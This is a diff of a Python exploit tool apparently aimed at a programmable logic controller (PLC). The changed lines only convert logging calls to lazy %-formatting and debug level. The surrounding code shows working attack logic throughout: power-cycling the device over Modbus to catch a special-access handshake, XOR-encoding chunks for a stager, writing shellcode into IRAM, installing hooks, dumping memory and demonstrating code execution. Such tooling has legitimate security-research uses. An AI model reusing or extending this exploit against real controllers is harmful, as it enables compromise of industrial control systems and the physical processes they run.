@@ -67,7 +67,7 @@ class PayloadManager(object):
                 self.next_payload_location += 1
 
 def print_answ(r, answ):
-    logger.info("Got answer: {} [{}]".format(answ, hexlify(answ)))
+    logger.info("Got answer: %s [%s]", answ, hexlify(answ))
 
 def calc_checksum_byte(incoming):
     # Format: <len_byte><byte_00>..<byte_xx><checksum_byte>
@@ -80,7 +80,7 @@ def send_packet(r, msg, step=2, sleep_amt=0.01):
     time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
     msg = chr(len(msg)+1)+msg
     msg = msg + calc_checksum_byte(msg)
-    log.info("sending packet: {}".format(msg.encode("hex")))
+    log.debug("sending packet: %s", msg.encode("hex"))
     for i in range(0, len(msg), step):
         time.sleep(sleep_amt)
         r.send(msg[i:i+step])
@@ -124,17 +124,16 @@ def recv_many(r, verbose=False, total_bytes=None, baudrate=115200):
                 bar_len = 30
                 filled = int(bar_len * percent)
                 bar = '[' + '=' * filled + ' ' * (bar_len - filled) + ']'
-                sys.stdout.write("\r{} {:6.1f}% {}/{} bytes | Elapsed: {:5.1f}s | ETA: {:5.1f}s".format(
-                    bar, percent*100, done, total_bytes, elapsed, est_left))
-                sys.stdout.flush()
+                logger.debug("\r%s {:6.1f}%% %d/%d bytes | Elapsed: %.1fs | ETA: %.1fs",
+                             bar, percent * 100, done, total_bytes, elapsed, est_left)
     if total_bytes:
-        sys.stdout.write("\n")
+        logger.debug("\n")
     return answ
 
 def encode_packet_for_stager(chunk):
     for i in range(1, 256):
         if chr(i) not in chunk and i != len(chunk)+2:
-            log.info("Sending chunk with xor key: 0x{:02x}".format(i))
+            log.debug("Sending chunk with xor key: 0x%02x", i)
             encoded = chr(i) + "".join(map(lambda x: chr(ord(x) ^ i), chunk))
             return encoded
     logger.error("Could not encode chunk: {}".format(chunk.encode("hex")))
@@ -144,7 +143,7 @@ def send_full_msg_via_stager(r, msg, chunk_size=2, sleep_amt=0.01):
     for i in range(0, len(msg), MAX_MSG_LEN-1):
         time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
         chunk = msg[i:i + MAX_MSG_LEN - 1]
-        log.info("Send progress: 0x{:06x}/0x{:06x} ({:3.2f})".format(i, len(msg), float(i)/float(len(msg))))
+        log.debug("Send progress: 0x%06x/0x%06x (%3.2f)", i, len(msg), float(i) / float(len(msg)))
         send_packet(r, encode_packet_for_stager(chunk), chunk_size, sleep_amt)
         answ = recv_packet(r)
         if not len(answ) == 1:
@@ -211,7 +210,7 @@ def exploit_write_to_iram(r, tar, contents):
         contents = contents[2:]
     chunk_size = 16
     for i in range(0, len(contents), chunk_size):
-        logger.info("Writing {:04x}/{:04x}".format(i, len(contents)))
+        logger.debug("Writing %04x/%04x", i, len(contents))
         chunk = contents[i:i+chunk_size]
         answ = _exploit_write_chunk_to_iram(r, tar+i, chunk, True)
     leave_subproto_handler(r)
@@ -228,11 +227,11 @@ def bye(r):
     send_packet(r, chr(hook_ind))
     answ = recv_packet(r)
     if answ == "\xa2\x00":
-        logger.info("[+] PLC responded to bye() as expected ({}).".format(repr(answ)))
+        logger.debug("[+] PLC responded to bye() as expected (%s).", repr(answ))
     elif answ and ord(answ[0]) in range(0x00, 0x80):
-        logger.warning("[!] PLC responded to bye() with handler index: 0x{:02x} ({}), likely last handler used.".format(ord(answ[0]), repr(answ)))
+        logger.warning("[!] PLC responded to bye() with handler index: 0x%02x (%s), likely last handler used.", ord(answ[0]), repr(answ))
     else:
-        logger.warning("[!] Warning: Unexpected response to bye(): {}".format(repr(answ)))
+        logger.warning("[!] Warning: Unexpected response to bye(): %s", repr(answ))
 
 def invoke_add_hook(r, add_hook_no, args="", await_response=True):
     assert(0 <= add_hook_no <= 0x20)
@@ -265,15 +264,15 @@ def install_addhook_via_stager(r, tar_addr, shellcode, stager_addhook_ind=DEFAUL
 
 def payload_dump_mem(r, tar_addr, num_bytes, addhook_ind, baudrate=115200):
     answ = invoke_add_hook(r, addhook_ind, "A"+struct.pack(">II", tar_addr, num_bytes))
-    log.debug("[payload_dump_mem] answ (len: {}): {}".format(len(answ), answ))
+    log.debug("[payload_dump_mem] answ (len: %d): %s", len(answ), answ)
     assert(answ.startswith("Ok"))
     contents = recv_many(r, verbose=False, total_bytes=num_bytes, baudrate=baudrate)
     return contents
 
 def handle_conn(r, action, args, payload_manager):
-    logger.info("[+] Got connection")
+    logger.debug("[+] Got connection")
     answ = recv_packet(r)
-    logger.info('\x1b[6;30;42m[+] Got special access greeting: {} [{}]\x1b[0m'.format(answ, hexlify(answ)))
+    logger.debug('\x1b[6;30;42m[+] Got special access greeting: %s [%s]\x1b[0m', answ, hexlify(answ))
 
     for i in range(1):
         version = get_version(r)
@@ -284,7 +283,7 @@ def handle_conn(r, action, args, payload_manager):
     start = time.time()
     stager_payload = args.stager.read() if hasattr(args, "stager") and args.stager else None
     stager_addhook_ind = install_stager(r, stager_payload)
-    logger.info("Writing the initial stage took {} seconds".format(time.time()-start))
+    logger.debug("Writing the initial stage took %d seconds", time.time()-start)
 
     # Unified payload reading
     payload = args.payload.read() if hasattr(args, "payload") and args.payload else None
@@ -298,28 +297,28 @@ def handle_conn(r, action, args, payload_manager):
         start = time.time()
         second_addhook_ind = install_addhook_via_stager(
             r, payload_manager.next_payload_location, payload, stager_addhook_ind, DEFAULT_SECOND_ADD_HOOK_IND, payload_manager)
-        logger.info("Installing the additional hook took {} seconds".format(time.time()-start))
+        logger.debug("Installing the additional hook took %d seconds", time.time()-start)
 
     if action == ACTION_INVOKE_HOOK:
         answ = invoke_add_hook(r, second_addhook_ind, args.args)
-        logger.info("Got answer: {}".format(answ))
+        logger.info("Got answer: %s", answ)
 
     elif action == ACTION_DUMP:
         out_filename = args.outfile if hasattr(args, "outfile") and args.outfile else "mem_dump_{:08x}_{:08x}".format(args.address, args.address + args.length)
-        logger.info("dumping a total of {} bytes of memory at 0x{:08x}".format(args.length, args.address))
+        logger.info("dumping a total of %d bytes of memory at 0x%08x", args.length, args.address)
         contents = payload_dump_mem(r, args.address, args.length, second_addhook_ind, baudrate=38400)
         with open(out_filename, "wb") as f:
             f.write(contents)
-        logger.info("Wrote data out to {}".format(out_filename))
+        logger.info("Wrote data out to %s", out_filename)
 
     elif action == ACTION_TEST:
         answ = invoke_add_hook(r, second_addhook_ind)
-        logger.info("Got answer: {}".format(answ))
+        logger.info("Got answer: %s", answ)
 
     elif action == ACTION_HELLO_LOOP:
         answ = invoke_add_hook(r, second_addhook_ind, await_response=False)
         while True:
-            logger.info("Got packet: {}".format(recv_packet(r)))
+            logger.info("Got packet: %s", recv_packet(r))
 
     elif action == ACTION_TIC_TAC_TOE:
         logger.info("[*] Demonstrating Code Execution")
@@ -328,8 +327,7 @@ def handle_conn(r, action, args, payload_manager):
         END_TOKEN = "==>"
         while END_TOKEN not in msg:
             msg = recv_packet(r)
-            sys.stdout.write(msg)
-            sys.stdout.flush()
+            logger.info(msg)
             if "enter a number" in msg:
                 choice = raw_input()
                 send_packet(r, choice[0])
@@ -395,11 +393,11 @@ def main():
     try:
         s = remote("localhost", args.port)
     except Exception as e:
-        logger.error("[!] Failed to connect to remote host on port {}: {}".format(args.port, e))
+        logger.error("[!] Failed to connect to remote host on port %d: %s", args.port, e)
         sys.exit(1)
 
     if args.switch_power:
-        logger.info("Turning off power supply and sleeping for {:d} milliseconds".format(args.powersupply_delay))
+        logger.info("Turning off power supply and sleeping for %d milliseconds", args.powersupply_delay)
         power_args = [
             '--method', 'modbus',
             '--modbus-ip', str(args.modbus_ip) if args.modbus_ip else '',
@@ -411,7 +409,7 @@ def main():
             ret = subprocess.check_call(['tools/powersupply/switch_power.py'] + power_args + ['off'])
             logger.info("[+] Turned off power supply, sleeping and starting handshake attempts")
         except subprocess.CalledProcessError as e:
-            logger.error("[!] Failed to turn off power supply: {}".format(e))
+            logger.error("[!] Failed to turn off power supply: %s", e)
             sys.exit(1)
 
         power_off_success = ret
@@ -429,9 +427,9 @@ def main():
             if now >= power_on_time and power_on_actual is None:
                 try:
                     ret = subprocess.check_call(['tools/powersupply/switch_power.py'] + power_args + ['on'])
-                    logger.info("[+] Turned on power supply after {:d} ms".format(args.powersupply_delay))
+                    logger.info("[+] Turned on power supply after %d ms", args.powersupply_delay)
                 except subprocess.CalledProcessError as e:
-                    logger.error("[!] Failed to turn on power supply: {}".format(e))
+                    logger.error("[!] Failed to turn on power supply: %s", e)
                     sys.exit(1)
                 power_on_actual = time.time()
             if power_on_actual is not None and (now - power_on_actual) > 5.0:
@@ -449,7 +447,7 @@ def main():
                     assert(answ.startswith("\5-CPU"))
                     s.unrecv(answ)
                     handshake_received = True
-                    logger.info("[+] Special access greeting received!")
+                    logger.debug("[+] Special access greeting received!")
                     handle_conn(s, args.action, args, payload_manager)
                     break
             i += 1
